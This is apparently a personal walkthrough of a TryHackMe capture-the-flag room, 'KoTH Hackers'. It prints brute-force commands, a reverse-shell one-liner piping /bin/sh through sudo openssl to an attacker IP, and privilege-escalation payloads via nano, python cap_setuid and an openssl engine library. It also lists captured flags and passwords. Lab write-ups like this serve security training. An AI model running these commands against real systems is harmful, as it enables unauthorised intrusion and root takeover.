# Tryhackme.com Room : KoTH Hackers
`https://tryhackme.com/room/kothhackers`


# Instance
```
export IP=10.10.228.42
```

# Nmap
First the box doesn't respond to `nmap -sC -sV -A $IP` but it did work with `nmap -sC -sV -A $IP`

```
21/tcp   open  ftp     vsftpd 2.0.8 or later
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--    1 ftp      ftp           400 Apr 29 03:57 note
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:10.10.98.27
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.3 - secure, fast, stable
|_End of status
22/tcp   open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 ff:ea:b0:58:35:79:df:b3:c1:57:01:43:09:be:2a:d5 (RSA)
|   256 3b:ff:4a:88:4f:dc:03:31:b6:9b:dd:ea:69:85:b0:af (ECDSA)
|_  256 fa:fd:4c:0a:03:b6:f7:1c:ee:f8:33:43:dc:b4:75:41 (ED25519)
80/tcp   open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Ellingson Mineral Company
9999/tcp open  abyss?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest, HTTPOptions: 
|     HTTP/1.0 200 OK
|     Date: Wed, 24 Jun 2020 00:45:29 GMT
|     Content-Length: 1
|     Content-Type: text/plain; charset=utf-8
|   GenericLines, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request
```

We find a `note` file on the `ftp` :
```
Note:
Any users with passwords in this list:
love
sex
god
secret
will be subject to an immediate disciplinary hearing.
Any users with other weak passwords will be complained at, loudly.
These users are:
rcampbell:Robert M. Campbell:Weak password
gcrawford:Gerard B. Crawford:Exposing crypto keys, weak password
Exposing the company's cryptographic keys is a disciplinary offense.
Eugene Belford, CSO
```

We got a list of password to try.
We see users
```
rcampbell -> Weak password
gcrawford -> Expose crypto key, weak password
```

From the staff page we find 3 names :
```
Duke Ellingson
Eugene Beldford
Margo Wallace
```

Username seems to user first letter of first name and last name so we get potential usernames :
```
dellingson
ebeldford
mwallace
```

We find more names & potential usernames in `/news` :
```
Mark Dickerson -> mdickerson
Jennie T. Baker -> jbaker ?
Louie J. Chatman -> lchatman ?
```

All potentials usernames :
```
dellingson
ebeldford
mwallace
mdickerson
jbaker
lchatman
rcampbell
gcrawford
```

We gobuster the webserver `gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://$IP`:
```
/backdoor (Status: 301)
/contact (Status: 301)
/img (Status: 301)
/index.html (Status: 301)
/news (Status: 301)
/robots.txt (Status: 200)
/staff (Status: 301)
```

Nothing usefull in `robots.txt`
```
Skiddies keep out.
Any unauthorised access will be forwarded straight to Richard McGill FBI and you WILL be arrested.
- plague
```

We have a login page in `/backdoor`

Looking at the login page, we find that it do a post request to `/api/login`.

We run `patator ssh_login host=$IP user=FILE0 password=FILE1 0=user.txt 1=pass.txt -x ignore:mesg='Authentication failed.'` on the ssh server and find that user `gcrawford` can only log in via a keyfile. Maybe we can access that file via the web interface ? Maybe some local file inclusion somewhere ?

in `/backdoor/login.js` we find that if the credentials are good, we are redirected to `/backdoor/shell`.
But we are instantaneously redirected to `/backdoor` when reaching the page.

We use `wget http://$IP/backdoor/shell` to retrieve the html:
```
<!DOCTYPE html>
<html>

<head>
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <title>Backdoor</title>
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <link rel="stylesheet" type="text/css" media="screen" href="backdoor.css">
    <script src="backdoor.js"></script>
    <script src="/cookie.js"></script>
</head>

<body onload="onLoad()">
    <pre id="outputBox">
    </pre>
    <form id="inputForm">
        <label for="inputBox">plague@gibson:$</label>
    <input id="inputBox" autofocus>
    </form>
</body>
</html>
```

We see that the shell is logged as the user `plague`.

The file `/cookie.js` contains the library `js-cookie v3.0.0-beta.4`

Let's check `/backdoor/shell/backdoor.js`

We find the `onload` method :
```
function onLoad() {
    const inputBox = document.getElementById("inputBox");
    const token = Cookies.get("SessionToken");
    if (token === undefined || token === "") {
        window.location = "/";
    }
    document.onclick = function () { inputBox.focus() };
    document.getElementById("inputForm").addEventListener("submit", function (event) {
        //on pressing enter
        event.preventDefault()
        runCommand(inputBox.value)
        inputBox.value = "";
    });
    printSplash()
}
```

So we need to modify the javascript cookie.

We fire up the dev console at `/` and do `import('/cookie.js')`
We then get access to `Cookies` and we can do 
```
Cookies.set('SettionToken', 'Haxx0r_420_blazeit')
```

And navigate back to `/backdoor/shell`.

We now have a webshell. Well. Not exactly, every command give me
```
Bad Token
```

We see in the code that the "webshell" just do a POST to `/api/cmd`

If we look at that code more closely :
```
async function postData(url = '', data = {}) {
    // Default options are marked with *
    const response = await fetch(url, {
        method: 'POST', // *GET, POST, PUT, DELETE, etc.
        cache: 'no-cache', // *default, no-cache, reload, force-cache, only-if-cached
        credentials: 'same-origin', // include, *same-origin, omit
        headers: {
            'Content-Type': 'text/plain'
            // 'Content-Type': 'application/x-www-form-urlencoded',
        },
        redirect: 'follow', // manual, *follow, error
        referrerPolicy: 'no-referrer', // no-referrer, *client
        body: data // body data type must match "Content-Type" header
    });
    return response; // We don't always want JSON back
}
```

We see that `Content-Type` might be wrong. But what can be the parameters ?

In the meantime, our `patator ssh_login` run came back with :
```
rcampbell:tinker
```

We get the first flag in `/home/rcampbell/.flag`:
```
thm{12361ad240fec43005844016092f1e05}
```

There is actually only 4 accounts on the box :
```
rcampbell
gcrawford
production
tryhackme
```

The webserver run in `/home/production/webserver/server -p 80` as `production`

We can't read anything in other `/home/` folders.

`sudo -l` give nothing.
Lets run linpeas :
```
Sudo version 1.8.21p2
```

We find another flag with `find / 2>/dev/null | grep flag` in `/var/ftp/.flag`
```
thm{678d0231fb4e2150afc1c4e336fcf44d}
```

vsftp is runned as root. Can we exploit this ? Doesn't seem like we can...

Hmmm.. I'm a bit on a dead end with this `rcampbell` user... 

Let's try to figure out the `/api/cmd` i guess. Maybe `production` have better access

Sooo, I looked up the write up to get an hint. Even if ssh password auth is disabled for gcrawford, we can bruteforce it's `ftp` password.
Got to say, I tried bruteforcing it.. didn't work, took ages. Not sure how they managed to do it in 7 minutes with rockyou ?

Anyhow, I just grabbed the credentials from there
```
gcrawford:evelina
```

Hmmmmm... Welllll, for some reason, the creds in the writeup doesn't work...
Yeahh.. can confirm with the `rcampbell` password. Definitely not the same as mine...

Well, we'll continue to bruteforce the ftp then...

Dooohhh, Reading the write up, I understand why the webshell wasn't working...
I was getting the error `bad token` and I didn't realised that the server didn't like my spoofed `SessionToken`.
Was a good try to get around the client side redirection but we need to be logged in to send cmds.

From the `/backdoor/shell` html code, we knew that the user was probably `plague`.

So let's try to bruteforce the `/backdoor` login

```
patator http_fuzz url=http://$IP/api/login method=POST body="username=plague&password=FILE0" 0=/usr/share/wordlists/rockyou.txt -x ignore:fgrep="Incorrect"
```

We find plague password:
```
plague:namaste
```

And now we are logged in as `production`.

We `sudo -l` :
```
(root) NOPASSWD: /usr/bin/openssl
```

We find on gtfobin that we can listen on a port using `openssl` on our machine with :
```
openssl req -x509 -newkey rsa:4096 -keyout key.pem -out cert.pem -days 365 -nodes

openssl s_server -quiet -key key.pem -cert cert.pem -port 8888
```

Then we run this on the box :
```
mkfifo /tmp/s; /bin/sh -i < /tmp/s 2>&1 | sudo openssl s_client -quiet -connect 10.10.231.206:8889 > /tmp/s; rm /tmp/s
```

For some reason, it gives us a shell but it isn't root... lame.

We can still browse the `production` user. We find a flag in `/home/production/.flag`:
```
thm{879f3238fb0a4bf1c23fd82032d237ff}
```

There was apparently a flag in a css file comment :
```
/home/production/webserver/resources/main.css:
/* Curious one, aren't you? Have a flag. thm{b63670f7192689782a45d8044c63197f}*/
```

```
thm{b63670f7192689782a45d8044c63197f}
```

In the meantime, the password for gcrawford returned :
```
gcrawford:yusuke
```

We retrieve the ssh key using ftp and login via ssh.
But we got to enter a passphrase.. I guess we have to crack it with John.

We run 
```
/usr/share/john/ssh2john.py ./id_rsa > id_rsa.hash

john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa.hash
```

And we find the passphrase :
```
shellie
```

We login as gcrawford.
We find a flag in `/home/gcrawford/business.txt`
```
thm{d8deb5f0526ec81f784ce68e641cde40}
```

`sudo -l` returns:
```
User gcrawford may run the following commands on gibson:
    (root) /bin/nano /home/gcrawford/business.txt
```

Hmmm, what can we do with this ?
Gtfobins tell us
```
sudo nano
^R^X
reset; sh 1>&0 2>&0
```

So we get in and we got a root shell
```
uid=0(root) gid=0(root) groups=0(root)
```

We get a flag in `/root/.flag`
```
thm{b94f8d2e715973f8bc75fe099c8492c4}
```

Ok so, now we got 7 flags on 9.

Let's find the others as root.

There is one in `cat /home/tryhackme/.flag`
```
thm{3ce2fe64055d3b543360c3fc880194f8}
```

Can't find the last flag..

We look up the write up and find some other interesting ways to exploit the machine.

the python binary have a capability `cap_setuid`.
We can find such capabilities using `getcap -r / 2>/dev/null`
```
/usr/bin/python3.6 = cap_setuid+ep
/usr/bin/python3.6m = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
```

This mean that python can use setuid() without restrictions.
We can write a small python script :
```py
import os
import pty

os.setuid(0)
pty.spawn("/bin/bash")
```

And we get root access.
This seems to be the only way to get root with `rcampbell`.

Now with `gcrawford` we can run `sudo openssl` but we couldn't get the reverse shell to work.
We didn't push further down that way but in the write up they wrote a small shared library that can be call from `openssl` using the `-engine` parameter.

The code of the shared library :
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
	setgid(0);
	setuid(0);
	system("/bin/sh");
}
```

We compile it with `gcc -fPIC -shared -o shell.so shell.c -nostartfiles` on our machine. Send the file via netcat

Then we run `sudo openssl req -engine /tmp/shell.so`
And we get root !

